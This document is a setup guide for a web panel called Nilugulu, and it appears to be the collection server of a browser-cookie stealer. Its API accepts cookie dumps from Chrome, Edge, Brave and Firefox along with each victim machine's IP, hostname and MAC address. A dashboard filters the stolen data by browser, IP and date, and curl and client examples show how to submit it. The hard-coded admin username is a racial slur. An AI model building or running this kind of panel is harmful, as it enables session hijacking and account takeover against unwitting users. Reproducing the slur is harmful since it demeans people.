# Nilugulu - Setup Guide

## Quick Start

The application is ready to use! Here's what you need to know:

### 🚀 Server is Running

Your Next.js application is running at:
- **Local URL**: http://localhost:3001
- **Network URL**: http://10.102.58.137:3001

### 🔑 Default Admin Credentials

The default admin user has been created:
- **Email**: `supernigga`
- **Password**: `jaihonilubaba`

### 📝 Available Pages

1. **Home** (`/`) - Redirects to login
2. **Login** (`/login`) - Admin login page
3. **Register** (`/register`) - Create new admin users
4. **Dashboard** (`/dashboard`) - Protected admin dashboard

### 🔧 API Endpoints

#### 1. Submit Cookies
```bash
POST http://localhost:3001/api/submit-cookies
Content-Type: application/json

{
  "timestamp": "2024-01-07T12:00:00Z",
  "public_ip": "192.168.1.1",
  "device_info": {
    "os_system": "Windows",
    "os_release": "10",
    "hostname": "DESKTOP-ABC",
    "mac_address": "00:11:22:33:44:55"
  },
  "cookies": {
    "chrome": [...],
    "edge": [...],
    "brave": [...],
    "firefox": [...]
  }
}
```

#### 2. Register New User
```bash
POST http://localhost:3001/api/register
Content-Type: application/json

{
  "email": "newuser@example.com",
  "password": "securepassword"
}
```

#### 3. Get Submissions (Authenticated)
```bash
GET http://localhost:3001/api/submissions?page=1&limit=10
Cookie: next-auth.session-token=<your-session-token>
```

### 🧪 Testing the API

Use the included Python script to test cookie submission:

```bash
python3 example-client.py
```

Or use curl:

```bash
curl -X POST http://localhost:3001/api/submit-cookies \
  -H "Content-Type: application/json" \
  -d '{
    "timestamp": "2024-01-07T12:00:00Z",
    "public_ip": "192.168.1.1",
    "device_info": {
      "os_system": "macOS",
      "hostname": "MacBook",
      "mac_address": "00:11:22:33:44:55"
    },
    "cookies": {
      "chrome": [
        {
          "name": "test",
          "value": "value",
          "domain": ".example.com",
          "path": "/"
        }
      ]
    }
  }'
```

### 📊 Dashboard Features

After logging in, you can:

1. **View All Submissions** - See all cookie submissions in a table
2. **Filter by Date Range** - Filter submissions by timestamp
3. **Filter by Browser** - Show only submissions with cookies from specific browsers
4. **Filter by IP** - Search for submissions by IP address
5. **Pagination** - Navigate through multiple pages of submissions
6. **Cookie Counts** - See how many cookies were found per browser

### 🛡️ Duplicate Detection

The system automatically detects duplicate submissions:
- Same MAC address
- Same cookies (all browsers)
- Within 5 minutes of each other

Duplicates are logged but not saved to the database.

### 📁 Database

**MongoDB Atlas Connection**:
- Database: `nilugulu`
- Collections: `users`, `submissions`
- Already configured in `.env.local`

### 🎨 Technology Stack

- **Frontend**: Next.js 14, React 19, Tailwind CSS, shadcn/ui
- **Backend**: Next.js API Routes, NextAuth.js
- **Database**: MongoDB Atlas with Mongoose
- **Authentication**: NextAuth.js with Credentials provider

### 📦 npm Scripts

```bash
npm run dev      # Start development server
npm run build    # Build for production
npm run start    # Start production server
npm run lint     # Run ESLint
npm run seed     # Create default admin user
```

### 🔄 Resetting Admin Password

To reset the admin password:

1. Stop the server
2. Run: `npm run seed` (it will recreate the admin user)
3. Or use the register page to create a new admin

### 🚨 Important Notes

1. **Change default credentials** in production!
2. **Update NEXTAUTH_SECRET** in `.env.local` for production
3. The server is running on port **3001** (port 3000 was in use)
4. Session tokens are stored in HTTP-only cookies
5. Dashboard requires authentication

### 📝 Project Structure

```
nilugulu/
├── app/                      # Next.js 14 app directory
│   ├── api/                  # API routes
│   ├── dashboard/            # Dashboard page
│   ├── login/                # Login page
│   ├── register/             # Register page
│   └── layout.tsx            # Root layout
├── components/               # UI components
│   └── ui/                   # shadcn/ui components
├── lib/                      # Utility functions
│   ├── mongodb.ts            # MongoDB connection
│   └── auth.ts               # Auth helpers
├── models/                   # Mongoose models
│   ├── User.ts               # User model
│   └── Submission.ts         # Submission model
├── scripts/                  # Utility scripts
│   └── seed-admin.js         # Seed admin user
└── middleware.ts             # Route protection
```

### ✅ Next Steps

1. **Login**: Go to http://localhost:3001/login
2. **Use credentials**: supernigga / jaihonilubaba
3. **View dashboard**: Explore the admin panel
4. **Test API**: Use example-client.py or curl
5. **Create submissions**: Send cookie data via API

Enjoy your cookie tracking system! 🍪
